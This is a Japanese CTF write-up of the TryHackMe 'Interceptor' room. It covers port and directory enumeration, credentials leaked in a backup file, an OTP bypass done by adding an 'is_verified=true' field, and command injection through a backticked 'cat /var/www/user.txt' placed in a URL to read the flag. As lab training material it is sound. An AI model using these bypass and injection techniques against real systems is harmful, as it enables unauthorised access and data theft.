# Interceptor CTF

https://tryhackme.com/room/interceptor

## Enumeration

```shell
TARGET=10.145.136.106
sudo bash -c "echo $TARGET   intercept.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
53/tcp open  domain  syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,53,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH、DNS、HTTP。

```sh
root@ip-10-145-127-63:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.145.151.225
+ Target Hostname:    intercept.thm
+ Target Port:        80
+ Start Time:         2026-05-02 00:04:07 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ /login.php: Admin login page/section found.
+ Cookie phpMyAdmin created without the httponly flag
+ Cookie goto created without the httponly flag
+ Cookie back created without the httponly flag
+ Cookie pma_lang created without the httponly flag
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ /phpmyadmin/: phpMyAdmin directory found
+ 1707 items checked: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2026-05-02 00:04:11 (GMT1) (4 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### ディレクトリ列挙

```sh
dirsearch -u http://$TARGET -e php,txt

[00:07:56] 200 -  639B  - /assets/
[00:08:01] 200 -    0B  - /config.php
[00:08:03] 302 -    0B  - /dashboard.php  ->  login.php
[00:08:08] 200 -   93B  - /footer.php
[00:08:09] 200 -  585B  - /header.php
[00:08:12] 301 -  321B  - /javascript  ->  http://10.145.151.225/javascript/
[00:08:15] 200 -    1KB - /login.php
[00:08:15] 302 -    0B  - /logout.php  ->  index.php
[00:08:23] 301 -  321B  - /phpmyadmin  ->  http://10.145.151.225/phpmyadmin/
[00:08:24] 200 -    3KB - /phpmyadmin/
[00:08:24] 200 -    3KB - /phpmyadmin/index.php
[00:08:25] 200 -    3KB - /phpmyadmin/doc/html/index.html
[00:08:30] 302 -    0B  - /search.php  ->  login.php
[00:08:40] 200 -  477B  - /uploads/
```

## /login.php

ソース中のスクリプト。api_login.php が認証を受け持っている。

```javascript
const form = document.getElementById("loginForm");
const msg  = document.getElementById("msg");
const btn  = document.getElementById("btnLogin");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  msg.innerHTML = `<div class="text-muted">Signing in...</div>`;
  btn.disabled = true;

  const payload = new FormData(form);

  try {
    const res = await fetch("api_login.php", {
      method: "POST",
      body: payload
    });

    const data = await res.json();

    if (!data.ok) {
      msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">${data.error}</div>`;
      btn.disabled = false;
      return;
    }

    msg.innerHTML = `<div class="alert alert-success py-2 mb-0">${data.message}</div>`;
    setTimeout(() => window.location = data.redirect, 400);

  } catch (err) {
    msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">Something went wrong.</div>`;
    btn.disabled = false;
  }
});
```

適当に入力して送信したところ

```http
POST /api_login.php HTTP/1.1
Host: intercept.thm
Content-Length: 252
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMZCc6gXAJD6EArJ2
Accept: */*
Origin: http://intercept.thm
Referer: http://intercept.thm/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=fj4apssd6ind8laab8gnb87gau
Connection: keep-alive

------WebKitFormBoundaryMZCc6gXAJD6EArJ2
Content-Disposition: form-data; name="email"

admin@thm.com
------WebKitFormBoundaryMZCc6gXAJD6EArJ2
Content-Disposition: form-data; name="password"

password
------WebKitFormBoundaryMZCc6gXAJD6EArJ2--
```

```http
HTTP/1.1 200 OK
Date: Fri, 01 May 2026 23:15:36 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 43
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"ok":false,"error":"Invalid credentials."}
```

- SQLインジェクションは無かった。
- `email[]` `password[]` を試したがバイパスできず。
- Content-Type を multipart/form-data 以外（application/json 等）にするとパラメータが認識されない。 
- パラメータ値を 0, true にしてもInvalidのまま。

api_login.php 以外のエンドポイントが無いか確認したが、発見できなかった。

```sh
ffuf -u http://intercept.thm/api_FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fs 1491

________________________________________________

login                   [Status: 200, Size: 55, Words: 5, Lines: 1]
:: Progress: [56293/56293] :: Job [1/1] :: 2877 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

uploads 画面に `Apache/2.4.41 (Ubuntu) Server at intercept.thm Port 80` という表記があった。サブドメインは見つからなかった。

```sh
ffuf -u http://intercept.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.intercept.thm' -fs 1491
```

login.php.bak をダウンロードできた。

```php
$ cat login.php.bak
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
?>
（略）
<?php include "footer.php"; ?>
```


admin@mediahub.thm / MediaHub2026 でログイン成功。OTP入力画面に遷移。

verify_otp.php で、is_verified を true に設定すると認証される。

```http
POST /verify_otp.php HTTP/1.1
Host: intercept.thm
Content-Length: 242
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylDqIw04Utj5cnUlf
Accept: */*
Origin: http://intercept.thm
Referer: http://intercept.thm/otp.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=t2k631qqerc1pvedu0qqfb9gdm
Connection: keep-alive

------WebKitFormBoundarylDqIw04Utj5cnUlf
Content-Disposition: form-data; name="otp"

123455
------WebKitFormBoundarylDqIw04Utj5cnUlf
Content-Disposition: form-data; name="is_verified"

true
------WebKitFormBoundarylDqIw04Utj5cnUlf--
```


http://0.0.`cat /var/www/user.txt`　でフェッチしてフラグ取得。

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: 0.0.THM[REDACTED]
```

## 振り返り

- 説明文と実際の解法が著しく乖離していた。これは良くない。
- bak拡張子はテンプレートに追加。
- OTP回避でリクエストにis_verifiedを入れるのも釈然としなかったところ。

## Tags

#tags: #tags: #tags:
